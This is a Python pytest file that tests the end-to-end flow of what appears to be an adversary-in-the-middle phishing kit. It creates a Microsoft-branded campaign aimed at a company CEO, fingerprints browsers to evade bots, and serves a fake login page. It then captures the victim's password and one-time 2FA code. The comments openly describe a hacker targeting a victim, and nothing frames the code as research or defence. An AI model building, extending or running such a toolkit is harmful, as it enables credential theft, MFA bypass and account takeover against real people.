import pytest
import json
import os
import shutil
from unittest.mock import MagicMock, patch, AsyncMock
from fastapi.testclient import TestClient
from fastapi import FastAPI, Request
from core.api.routes import router
from core.social.manager import SocialEngineeringManager
from core.redirect.smart_redirector import SmartRedirector
from core.session.session_manager import SessionManager
from core.cache.redis_manager import redis_cache

# --- Setup App & Mocks ---

# Create a clean app instance for testing
app = FastAPI()
app.include_router(router)

# Mock Redis Store
class MockRedis:
    def __init__(self):
        self.store = {}
    
    def set(self, key, value, expire=None):
        # Serialize to simulate Redis behavior
        if isinstance(value, (dict, list)):
            self.store[key] = json.dumps(value)
        else:
            self.store[key] = value
        return True
        
    def get(self, key):
        val = self.store.get(key)
        if val and isinstance(val, str):
            try:
                return json.loads(val)
            except:
                return val
        return val

    def cached(self, key_prefix, expire=60):
        def decorator(func):
            async def wrapper(*args, **kwargs):
                return await func(*args, **kwargs)
            return wrapper
        return decorator

@pytest.fixture
def mock_redis_instance():
    return MockRedis()

@pytest.fixture
def client(mock_redis_instance, mock_antibot):
    # Patch the global redis_cache object's methods directly
    # This ensures all modules importing redis_cache use the mocked methods
    
    # Save original methods
    original_set = redis_cache.set
    original_get = redis_cache.get
    original_cached = redis_cache.cached
    
    # Replace with mock methods
    redis_cache.set = mock_redis_instance.set
    redis_cache.get = mock_redis_instance.get
    redis_cache.cached = mock_redis_instance.cached
    
    # Also ensure smart_redirector uses our mock antibot
    # We can set the attribute on the singleton instance
    from core.redirect.smart_redirector import smart_redirector
    original_antibot = smart_redirector.antibot
    smart_redirector.antibot = mock_antibot
    
    yield TestClient(app)
    
    # Restore original methods
    redis_cache.set = original_set
    redis_cache.get = original_get
    redis_cache.cached = original_cached
    smart_redirector.antibot = original_antibot

@pytest.fixture
def mock_qr_system():
    with patch("core.social.manager.QRLinkSystem") as MockQR:
        instance = MockQR.return_value
        instance.generate_qr.return_value = (True, "QR Generated")
        yield instance

@pytest.fixture
def mock_antibot():
    with patch("core.redirect.smart_redirector.antibot") as mock:
        mock.check_request = AsyncMock(return_value={"blocked": False})
        yield mock

# --- Tests ---

def test_full_attack_chain(client, mock_redis_instance, mock_qr_system, mock_antibot):
    """
    Simulates the entire attack flow:
    1. Hacker creates a campaign (Microsoft).
    2. Victim scans QR / clicks link (Redirector).
    3. Smart Redirector performs Fingerprinting.
    4. Victim is redirected to Phishing Page.
    5. Victim enters credentials (captured).
    6. Victim enters 2FA (captured).
    7. Victim is redirected to target.
    """
    
    # ---------------------------------------------------------
    # 1. Campaign Creation
    # ---------------------------------------------------------
    print("\n[1] Creating Campaign...")
    response = client.post("/v5/campaigns/create", data={
        "name": "Target CEO Attack",
        "template_id": "microsoft",
        "target_email": "ceo@target-corp.com"
    })
    
    assert response.status_code == 200
    campaign_data = response.json()["campaign"]
    campaign_id = campaign_data["id"]
    print(f"    Campaign ID: {campaign_id}")
    
    # Verify campaign stored in Redis
    assert mock_redis_instance.get(f"campaign:{campaign_id}") is not None

    # ---------------------------------------------------------
    # 2. Victim Clicks Link (Smart Redirector)
    # ---------------------------------------------------------
    print(f"\n[2] Victim Clicks Link: /v5/r/{campaign_id}")
    response = client.get(f"/v5/r/{campaign_id}", headers={"User-Agent": "Mozilla/5.0 (iPhone)"})
    
    assert response.status_code == 200
    # Should return the fingerprinting page (redirect.html)
    assert "Verifying your browser" in response.text or "redirect" in response.text.lower()
    
    # Check injection of IDs
    assert f'content="{campaign_id}"' in response.text
    
    # Extract session_id from meta tag (regex or string search)
    import re
    match = re.search(r'name="session-id" content="([^"]+)"', response.text)
    assert match is not None
    session_id = match.group(1)
    print(f"    Session ID Created: {session_id}")
    
    # Verify session in Redis
    session_data = mock_redis_instance.get(f"session:{session_id}")
    assert session_data is not None
    assert session_data["client_ip"] == "testclient" # TestClient default IP

    # ---------------------------------------------------------
    # 3. Fingerprint Verification
    # ---------------------------------------------------------
    print("\n[3] Browser sends Fingerprint...")
    fp_data = {
        "user_agent": "Mozilla/5.0 (iPhone)",
        "screen_width": 375,
        "screen_height": 812,
        "color_depth": 24,
        "timezone_offset": -60,
        "platform": "iPhone",
        "language": "en-US",
        "fonts_detected": ["Arial", "Helvetica"],
        "audio_hash": "12345",
        "canvas_hash": "67890",
        "touch_support": True,
        # Fields required to pass validation
        "webgl_renderer": "Apple GPU",
        "webgl_vendor": "Apple Inc.",
        "mouse_movements": 15,
        "scroll_events": 5,
        "time_on_page": 1500,
        "is_webdriver": False
    }
    
    response = client.post("/v5/verify_fingerprint", json={
        "campaign_id": campaign_id,
        "session_id": session_id,
        "fingerprint": fp_data
    })
    
    assert response.status_code == 200
    result = response.json()
    
    # Since it's an AiTM campaign (default), should redirect to /v5/p/{session_id}/
    # BUT wait, create_campaign default type is "aitm"?
    # Let's check social_manager.create_campaign signature.
    # Yes, default is "aitm".
    expected_redirect = f"/v5/p/{session_id}/"
    assert result["redirect_to"] == expected_redirect
    print(f"    Redirected to: {result['redirect_to']}")

    # ---------------------------------------------------------
    # 4. Phishing Page (Template Mode Fallback for Test)
    # ---------------------------------------------------------
    # NOTE: In AiTM mode, the user goes to /v5/p/... which proxies the real site.
    # For this test, we want to test the Phantasm capture flow, which is typically used 
    # when we serve our own template (campaign_type="template") OR when AiTM injects script.
    # Let's switch campaign to 'template' mode to test the /v5/phish/... endpoint and capture.
    
    # Update campaign type in Redis
    campaign_data["type"] = "template"
    mock_redis_instance.set(f"campaign:{campaign_id}", campaign_data)
    
    # Re-verify fingerprint to get template URL
    response = client.post("/v5/verify_fingerprint", json={
        "campaign_id": campaign_id,
        "session_id": session_id,
        "fingerprint": fp_data
    })
    result = response.json()
    expected_phish_url = f"/v5/phish/{campaign_id}/login?sid={session_id}"
    assert result["redirect_to"] == expected_phish_url
    
    print("\n[4] Victim Lands on Phishing Page...")
    response = client.get(expected_phish_url)
    assert response.status_code == 200
    assert "Microsoft" in response.text # Assuming Microsoft template
    # Verify variable injection
    assert session_id in response.text
    
    # ---------------------------------------------------------
    # 5. Credential Submission (Phantasm)
    # ---------------------------------------------------------
    print("\n[5] Victim Submits Credentials...")
    
    # Step 1: Password
    login_data = {
        "email": "ceo@target-corp.com",
        "password": "CorrectHorseBatteryStaple"
    }
    
    # Phantasm sends JSON to /v5/auth/login
    response = client.post(f"/v5/auth/login?sid={session_id}", json=login_data)
    
    assert response.status_code == 200
    resp_json = response.json()
    
    # Should ask for 2FA because we sent password but no OTP
    assert resp_json["status"] == "2fa_required"
    print("    Password captured. 2FA requested.")
    
    # Verify partial capture in Redis
    session_data = mock_redis_instance.get(f"session:{session_id}")
    assert session_data["captured_data"]["password"] == "CorrectHorseBatteryStaple"
    
    # Step 2: OTP
    print("\n[6] Victim Submits OTP...")
    otp_data = {
        "otp": "998877"
    }
    
    response = client.post(f"/v5/auth/login?sid={session_id}", json=otp_data)
    
    assert response.status_code == 200
    resp_json = response.json()
    
    # Should succeed and redirect
    assert resp_json["status"] == "success"
    assert resp_json["redirect"] is not None
    print(f"    OTP captured. Redirecting to: {resp_json['redirect']}")
    
    # Verify full capture
    session_data = mock_redis_instance.get(f"session:{session_id}")
    assert session_data["captured_data"]["otp"] == "998877"
    
    print("\n[✓] Full Attack Chain Verified Successfully!")
